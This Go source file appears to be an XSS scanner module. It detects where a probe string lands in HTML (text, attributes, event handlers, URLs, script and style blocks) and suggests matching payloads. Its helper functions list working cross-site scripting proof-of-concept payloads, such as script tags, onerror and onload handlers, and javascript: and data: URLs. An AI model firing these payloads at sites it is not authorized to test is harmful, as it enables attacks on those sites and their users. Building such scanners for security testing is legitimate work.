package xss

import (
	"bytes"
	"strings"
	"unicode"

	"golang.org/x/net/html"
)

// ContextType represents the type of XSS injection context
type ContextType int

const (
	ContextUnknown ContextType = iota
	ContextHTMLText
	ContextHTMLAttribute
	ContextJavaScript
	ContextCSS
	ContextURL
	ContextScriptBlock
	ContextStyleBlock
)

// String returns the string representation of the context type
func (c ContextType) String() string {
	switch c {
	case ContextHTMLText:
		return "html-text"
	case ContextHTMLAttribute:
		return "html-attribute"
	case ContextJavaScript:
		return "javascript"
	case ContextCSS:
		return "css"
	case ContextURL:
		return "url"
	case ContextScriptBlock:
		return "script-block"
	case ContextStyleBlock:
		return "style-block"
	default:
		return "unknown"
	}
}

// XSSContextAnalyzer analyzes HTML content to detect XSS injection contexts
type XSSContextAnalyzer struct {
	payload string
}

// NewXSSContextAnalyzer creates a new XSS context analyzer
func NewXSSContextAnalyzer(payload string) *XSSContextAnalyzer {
	return &XSSContextAnalyzer{payload: payload}
}

// ContextAnalysis represents the analysis result for a specific context
type ContextAnalysis struct {
	Type        ContextType
	Location    int
	Escaped     bool
	Executable  bool
	Confidence  float64
	Suggestions []string
}

// Analyze analyzes the HTML content and returns the detected contexts
func (a *XSSContextAnalyzer) Analyze(htmlContent string) []ContextAnalysis {
	var contexts []ContextAnalysis
	
	// Check for payload in different contexts
	if ctx := a.analyzeHTMLContext(htmlContent); ctx != nil {
		contexts = append(contexts, *ctx)
	}
	
	if ctx := a.analyzeJavaScriptContext(htmlContent); ctx != nil {
		contexts = append(contexts, *ctx)
	}
	
	if ctx := a.analyzeCSSContext(htmlContent); ctx != nil {
		contexts = append(contexts, *ctx)
	}
	
	if ctx := a.analyzeURLContext(htmlContent); ctx != nil {
		contexts = append(contexts, *ctx)
	}
	
	return contexts
}

// analyzeHTMLContext analyzes HTML text and tag contexts
func (a *XSSContextAnalyzer) analyzeHTMLContext(content string) *ContextAnalysis {
	tokenizer := html.NewTokenizer(strings.NewReader(content))
	
	for {
		tokenType := tokenizer.Next()
		if tokenType == html.ErrorToken {
			break
		}
		
		switch tokenType {
		case html.TextToken:
			text := string(tokenizer.Text())
			if idx := strings.Index(text, a.payload); idx != -1 {
				return &ContextAnalysis{
					Type:       ContextHTMLText,
					Location:   tokenizer.Offset(),
					Escaped:    a.isEscaped(text, a.payload),
					Executable: !a.isEscaped(text, a.payload),
					Confidence: 0.9,
					Suggestions: a.getHTMLPayloads(),
				}
			}
			
		case html.StartTagToken, html.SelfClosingTagToken:
			tagName, hasAttr := tokenizer.TagName()
			if hasAttr {
				for {
					key, val, more := tokenizer.TagAttr()
					attrValue := string(val)
					
					if idx := strings.Index(attrValue, a.payload); idx != -1 {
						ctx := &ContextAnalysis{
							Location:   tokenizer.Offset(),
							Confidence: 0.85,
						}
						
						// Check for URL contexts
						if a.isURLAttribute(string(key)) {
							ctx.Type = ContextURL
							ctx.Executable = true
							ctx.Suggestions = a.getURLPayloads()
						} else if a.isEventHandler(string(key)) {
							ctx.Type = ContextJavaScript
							ctx.Executable = true
							ctx.Suggestions = a.getJavaScriptPayloads()
						} else {
							ctx.Type = ContextHTMLAttribute
							ctx.Executable = false
							ctx.Suggestions = a.getAttributePayloads()
						}
						
						return ctx
					}
					
					if !more {
						break
					}
				}
			}
			
			// Check for script blocks - don't return early, continue scanning
			if string(tagName) == "script" {
				if ctx := a.analyzeScriptBlock(tokenizer, content); ctx != nil {
					return ctx
				}
			}
			
			// Check for style blocks - don't return early, continue scanning
			if string(tagName) == "style" {
				if ctx := a.analyzeStyleBlock(tokenizer, content); ctx != nil {
					return ctx
				}
			}
		}
	}
	
	return nil
}

// analyzeJavaScriptContext analyzes JavaScript contexts
func (a *XSSContextAnalyzer) analyzeJavaScriptContext(content string) *ContextAnalysis {
	// Check for payload in JavaScript contexts
	jsPatterns := []string{
		`"` + a.payload + `"`,
		"`" + a.payload + "`",
		"'" + a.payload + "'",
	}
	
	for _, pattern := range jsPatterns {
		if idx := strings.Index(content, pattern); idx != -1 {
			return &ContextAnalysis{
				Type:       ContextJavaScript,
				Location:   idx,
				Escaped:    false,
				Executable: true,
				Confidence: 0.95,
				Suggestions: a.getJavaScriptPayloads(),
			}
		}
	}
	
	return nil
}

// analyzeCSSContext analyzes CSS contexts
func (a *XSSContextAnalyzer) analyzeCSSContext(content string) *ContextAnalysis {
	if strings.Contains(content, "<style>") && strings.Contains(content, a.payload) {
		idx := strings.Index(content, a.payload)
		return &ContextAnalysis{
			Type:       ContextCSS,
			Location:   idx,
			Escaped:    false,
			Executable: true,
			Confidence: 0.8,
			Suggestions: a.getCSSPayloads(),
		}
	}
	
	return nil
}

// analyzeURLContext analyzes URL contexts
func (a *XSSContextAnalyzer) analyzeURLContext(content string) *ContextAnalysis {
	urlSchemes := []string{"javascript:", "data:", "vbscript:"}
	
	for _, scheme := range urlSchemes {
		if strings.Contains(content, scheme+a.payload) {
			idx := strings.Index(content, scheme+a.payload)
			return &ContextAnalysis{
				Type:       ContextURL,
				Location:   idx,
				Escaped:    false,
				Executable: true,
				Confidence: 0.95,
				Suggestions: a.getURLPayloads(),
			}
		}
	}
	
	return nil
}

// analyzeScriptBlock analyzes script block contexts
func (a *XSSContextAnalyzer) analyzeScriptBlock(tokenizer *html.Tokenizer, content string) *ContextAnalysis {
	tokenType := tokenizer.Next()
	if tokenType == html.TextToken {
		text := string(tokenizer.Text())
		if idx := strings.Index(text, a.payload); idx != -1 {
			return &ContextAnalysis{
				Type:       ContextScriptBlock,
				Location:   tokenizer.Offset(),
				Escaped:    false,
				Executable: true,
				Confidence: 0.9,
				Suggestions: a.getScriptBlockPayloads(),
			}
		}
	}
	
	return nil
}

// analyzeStyleBlock analyzes style block contexts
func (a *XSSContextAnalyzer) analyzeStyleBlock(tokenizer *html.Tokenizer, content string) *ContextAnalysis {
	tokenType := tokenizer.Next()
	if tokenType == html.TextToken {
		text := string(tokenizer.Text())
		if idx := strings.Index(text, a.payload); idx != -1 {
			return &ContextAnalysis{
				Type:       ContextStyleBlock,
				Location:   tokenizer.Offset(),
				Escaped:    false,
				Executable: true,
				Confidence: 0.85,
				Suggestions: a.getStyleBlockPayloads(),
			}
		}
	}
	
	return nil
}

// Helper functions

func (a *XSSContextAnalyzer) isEscaped(text, payload string) bool {
	if strings.Contains(text, "&lt;") || strings.Contains(text, "&gt;") ||
		strings.Contains(text, "&quot;") || strings.Contains(text, "&#") {
		return true
	}
	return false
}

func (a *XSSContextAnalyzer) isURLAttribute(attrName string) bool {
	urlAttrs := map[string]bool{
		"href": true, "src": true, "action": true, "formaction": true,
		"data": true, "poster": true, "codebase": true, "cite": true,
		"background": true, "manifest": true, "icon": true, "ping": true,
		"longdesc": true,
	}
	return urlAttrs[attrName]
}

func (a *XSSContextAnalyzer) isEventHandler(attrName string) bool {
	return strings.HasPrefix(attrName, "on")
}

// Payload suggestion functions

func (a *XSSContextAnalyzer) getHTMLPayloads() []string {
	return []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<iframe src=javascript:alert(1)>",
	}
}

func (a *XSSContextAnalyzer) getJavaScriptPayloads() []string {
	return []string{
		"';alert(1);//",
		"';alert(1);'",
		"\"><script>alert(1)</script>",
		"-alert(1)-",
	}
}

func (a *XSSContextAnalyzer) getAttributePayloads() []string {
	return []string{
		"\" onmouseover=alert(1) \"",
		"' onfocus=alert(1) autofocus='",
		"javascript:alert(1)",
	}
}

func (a *XSSContextAnalyzer) getURLPayloads() []string {
	return []string{
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"vbscript:msgbox(1)",
	}
}

func (a *XSSContextAnalyzer) getCSSPayloads() []string {
	return []string{
		"</style><script>alert(1)</script><style>",
		"body{background:url('javascript:alert(1)')}",
	}
}

func (a *XSSContextAnalyzer) getScriptBlockPayloads() []string {
	return []string{
		"';alert(1);//",
		"</script><script>alert(1)</script>",
		"-alert(1)-",
	}
}

func (a *XSSContextAnalyzer) getStyleBlockPayloads() []string {
	return []string{
		"</style><script>alert(1)</script><style>",
		"body{background:url('javascript:alert(1)')}",
	}
}

// GetSmartPayload returns the most appropriate payload based on context
func (a *XSSContextAnalyzer) GetSmartPayload(contexts []ContextAnalysis) string {
	if len(contexts) == 0 {
		return a.payload
	}
	
	var bestContext *ContextAnalysis
	for i := range contexts {
		if bestContext == nil || contexts[i].Confidence > bestContext.Confidence {
			bestContext = &contexts[i]
		}
	}
	
	if bestContext != nil && len(bestContext.Suggestions) > 0 {
		return bestContext.Suggestions[0]
	}
	
	return a.payload
}
